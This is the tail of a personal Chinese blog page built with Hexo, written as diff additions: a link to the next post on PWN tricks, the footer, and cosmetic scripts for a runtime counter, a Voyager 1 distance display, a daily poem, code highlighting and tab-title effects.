+      <a href="/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(3)/" style="flex: 1; text-decoration: none; color: #ccc; text-align: right;">
+        <div>
+          <div style="font-size: 0.85rem; color: #492630;">下一篇 ➡</div>
+          <div style="font-weight: bold; font-size: 1.1rem; margin-top: 0.3rem;">PWN PWN PWN !!! 技巧 (3)</div>
+          <div style="font-size: 0.85rem; margin-top: 0.5rem;">
+            <i class="fa fa-calendar"></i> 2023-10-27
+            
+              &nbsp;| <i class="fa fa-folder-open"></i> 
+            
+            
+              &nbsp;| <i class="fa fa-tags"></i>
+              
+                PWN
+              
+            
+          </div>
+        </div>
+      </a>
+    
+  </div>
+</div>
+
+
+  
+  
+  
+  
+
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+  const tocLis = document.querySelectorAll("#toc-container > ol > li");
+  const headers = [...document.querySelectorAll(".content h1")];
+  const idToTocLi = {};
+  tocLis.forEach(li => {
+    const a = li.querySelector("a");
+    if (!a) return;
+    const href = a.getAttribute("href");
+    if (!href || !href.startsWith("#")) return;
+    const id = decodeURIComponent(href.slice(1));
+    idToTocLi[id] = li;
+  });
+
+  function onScroll() {
+    const scrollTop = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop;
+    let currentIndex = 0;
+    for (let i = 0; i < headers.length; i++) {
+      const headerTop = headers[i].getBoundingClientRect().top + window.pageYOffset - 100;
+      if (scrollTop >= headerTop) {
+        currentIndex = i;
+      } else {
+        break;
+      }
+    }
+
+    tocLis.forEach(li => li.classList.remove("active"));
+    if (headers[currentIndex]) {
+      const id = headers[currentIndex].id;
+      if (idToTocLi[id]) {
+        idToTocLi[id].classList.add("active");
+      }
+    }
+  }
+
+  window.addEventListener("scroll", onScroll);
+  onScroll();
+});
+</script>
+
+            <footer id="footer">
+  <div id="footer-wrap">
+    <div>
+      &copy;
+      2022 - 2025 By Xzzzz911
+      <span id="footer-icon">
+        <i class="fa-solid fa-font-awesome fa-fw"></i>
+      </span>
+    </div>
+
+    <!-- 运行时长显示 -->
+    <div id="site-runtime"></div>
+
+    <!-- 访问统计 -->
+    <div>
+      本站总访问量：<span id="busuanzi_value_site_pv">加载中...</span> 次
+    </div>
+
+    <!-- 拯救者 1 号当前距离显示 -->
+    <div id="voyager1-distance">加载中...</div>
+
+    <div>
+      Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+      <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+    </div>
+
+    
+  </div>
+
+  <!-- Busuanzi 访问统计脚本 -->
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  <!-- 页面底部 JS：运行时间 + Voyager 动态距离 -->
+  <script>
+    const siteStartTime = new Date('2025-06-18T00:00:00');
+    const voyagerStartTime = new Date('2023-07-25T00:00:00');
+    let voyagerDistanceKm = 23400000000;
+    const STORAGE_KEY = 'voyager1_distance_km';
+    const AU_IN_KM = 1.495979e+8;
+
+    const storedDistance = parseInt(localStorage.getItem(STORAGE_KEY));
+    if (!isNaN(storedDistance) && storedDistance > voyagerDistanceKm) {
+      voyagerDistanceKm = storedDistance;
+    }
+
+    function padZero(num, len = 2) {
+      return num.toString().padStart(len, '0');
+    }
+
+    function updateSiteRuntime() {
+      const now = new Date();
+      const diffSeconds = Math.floor((now - siteStartTime) / 1000);
+
+      const days = Math.floor(diffSeconds / (3600 * 24));
+      const hours = Math.floor((diffSeconds % (3600 * 24)) / 3600);
+      const minutes = Math.floor((diffSeconds % 3600) / 60);
+      const seconds = diffSeconds % 60;
+
+      const isDaytime = hours >= 9 && hours < 18;
+      const message = isDaytime
+        ? "加油加油好好干，冲冲冲~"
+        : "好好放松吧，好好休息一下~";
+
+      document.getElementById("site-runtime").innerHTML = `
+        <div style="font-size:16px;font-weight:bold">${message}</div>
+        <div style="font-size:13px;font-weight:bold">
+          本站居然运行了 ${days} 天 ${padZero(hours)} 小时 ${padZero(minutes)} 分 ${padZero(seconds)} 秒
+          <i id="heartbeat" class="fas fa-heartbeat" style="color: red;"></i>
+        </div>
+      `;
+    }
+
+    function updateVoyagerDistance() {
+      const now = new Date();
+      const secondsPassed = Math.floor((now - voyagerStartTime) / 1000);
+      voyagerDistanceKm = 23400000000 + secondsPassed * 17;
+
+      localStorage.setItem(STORAGE_KEY, voyagerDistanceKm);
+
+      const au = (voyagerDistanceKm / AU_IN_KM).toFixed(6);
+
+      document.getElementById("voyager1-distance").innerHTML = `
+        拯救者 1 号当前距离地球 ${voyagerDistanceKm.toLocaleString()} 千米，
+        约为 ${au} 个天文单位 🚀
+      `;
+    }
+
+    function startTimers() {
+      updateSiteRuntime();
+      updateVoyagerDistance();
+      setInterval(() => {
+        updateSiteRuntime();
+        updateVoyagerDistance();
+      }, 1000);
+    }
+
+    window.addEventListener('DOMContentLoaded', startTimers);
+  </script>
+</footer>
+
+<!-- Typed.js -->
+<script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12"></script>
+<!-- 初始化打字机效果 -->
+<script src="/js/typed-subtitle.js"></script>
+
+<!-- 鼠标点击核心价值观文字特效 -->
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.6.4/dist/jquery.min.js"></script>
+
+<!-- 鼠标粒子拖尾特效 -->
+<script src="/js/mouse-particles.js"></script>
+
+<!-- 网站页面特效 -->
+<canvas id="universe" style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:-1;pointer-events:none;"></canvas>
+<script defer src="/js/universe.js"></script>
+<script src="/js/custom.js"></script>
+
+<!-- ✅ 鼠标点击特效 -->
+<script src="/js/click-effect.js"></script>
+
+<script src="/js/code-copy.js"></script>
+
+
+<!-- 鼠标星星特效，仅桌面端加载 -->
+<script>
+  if (window.innerWidth > 768) {
+    document.write('<script src="/js/star.js"><\/script>');
+  }
+</script>
+
+<!-- 今日诗词API脚本 -->
+<script src="https://fastly.jsdelivr.net/npm/js-heo@1.0.11/poem/jinrishici.js" charset="utf-8"></script>
+<script type="text/javascript">
+  jinrishici.load(function(result) {
+    if (result.status === "success") {
+      const data = result.data;
+      const content = data.content || "";
+      const origin = data.origin || {};
+      const title = origin.title || "";
+      const author = origin.author || data.author || "";
+      const dynasty = origin.dynasty || data.dynasty || "";
+
+      const sentenceEl = document.getElementById("poem_sentence");
+      if (sentenceEl) sentenceEl.innerText = content;
+
+      const metaEl = document.getElementById("poem_meta");
+      if (metaEl) {
+        metaEl.innerText = `${dynasty} · ${author} 《${title}》`;
+      }
+    } else {
+      console.warn("今日诗词 API 加载失败");
+    }
+  });
+</script>
+
+
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+
+        <!-- 阅读进度绳子 -->
+        <div
+        id="rope-progress"
+        :class="{'rope-visible': ropeHeight > 20}"
+        :style="{ height: ropeHeight + 'px' }"
+        >
+        <!-- ✅ 新增：透明点击区域 -->
+        <div
+            id="rope-click-layer"
+            title="点我回到顶部"
+            @click="scrollToTop"
+        ></div>
+
+        <!-- 进度百分比 -->
+        <div class="rope-percent" id="rope-percent">0%</div>
+
+        <!-- 绳子头图片 -->
+        <img
+            src="/images/rope-head.png"
+            alt="Rope Head"
+            draggable="false"
+            oncontextmenu="return false;"
+            @click.stop.prevent
+            style="width: 80px; height: 80px; margin-top: 50px; pointer-events: none;"
+        />
+        </div>
+
+
+    </div>
+
+    <script src="/js/main.js"></script>
+
+    <script>
+        // 保留你已有 PrismJS 代码不变
+        document.addEventListener('DOMContentLoaded', function () {
+            Prism.highlightAll();
+
+            document.querySelectorAll('pre code[class^="language-"]').forEach(function (codeBlock) {
+                const pre = codeBlock.parentElement;
+                if (!pre.classList.contains('line-numbers')) {
+                    const lang = Array.from(codeBlock.classList).find(c => c.startsWith('language-'));
+                    pre.classList.add('line-numbers');
+                    if (lang) pre.classList.add(lang);
+                }
+            });
+
+            Prism.highlightAll();
+
+            const target = document.querySelector('.content');
+            if (target) {
+                const observer = new MutationObserver(() => {
+                    Prism.highlightAll();
+                });
+                observer.observe(target, { childList: true, subtree: true });
+            }
+        });
+    </script>
+
+    <!-- 新增：监听标签页切换，动态修改标签页标题 -->
+    <script>
+    (function () {
+        const isPost = true; // ✅ 是否是文章页面
+        const originalTitle = document.title;
+        const awayTitle = "🤠别再玩了啦~";
+        const backTitle = "🚩给我狠狠学~";
+        let blinkInterval = null;
+        let isTabActive = true;
+
+        // 闪烁标题
+        function blinkTitle(titles, interval = 500, times = 6) {
+            let count = 0;
+            let index = 0;
+            if (blinkInterval) clearInterval(blinkInterval);
+            blinkInterval = setInterval(() => {
+                document.title = titles[index];
+                index = (index + 1) % titles.length;
+                count++;
+                if (count >= times) {
+                    clearInterval(blinkInterval);
+                    blinkInterval = null;
+                    if (isPost) updateScrollProgressTitle();
+                    else document.title = originalTitle;
+                }
+            }, interval);
+        }
+
+        // 更新标题为进度百分比
+        function updateScrollProgressTitle() {
+            const scrollTop = document.documentElement.scrollTop || document.body.scrollTop;
+            const scrollHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+            const percent = Math.min(100, Math.round((scrollTop / scrollHeight) * 100));
+            document.title = `📖 ${percent}% | ${originalTitle}`;
+        }
+
+        // 页面可见性切换
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                isTabActive = false;
+                if (blinkInterval) clearInterval(blinkInterval);
+                document.title = awayTitle;
+            } else {
+                isTabActive = true;
+                document.title = backTitle;
+                blinkTitle([backTitle, originalTitle], 500, 6);
+            }
+        });
+
+        // 仅在文章页监听滚动和初始化
+        if (isPost) {
+            window.addEventListener('scroll', () => {
+                if (isTabActive) updateScrollProgressTitle();
+            });
+            window.addEventListener('load', () => {
+                updateScrollProgressTitle();
+            });
+        }
+    })();
+    </script>
+
+
+
+
+
+
+
+    
+    
+
+
+
+
+    
+
+
+</body>
+</html>
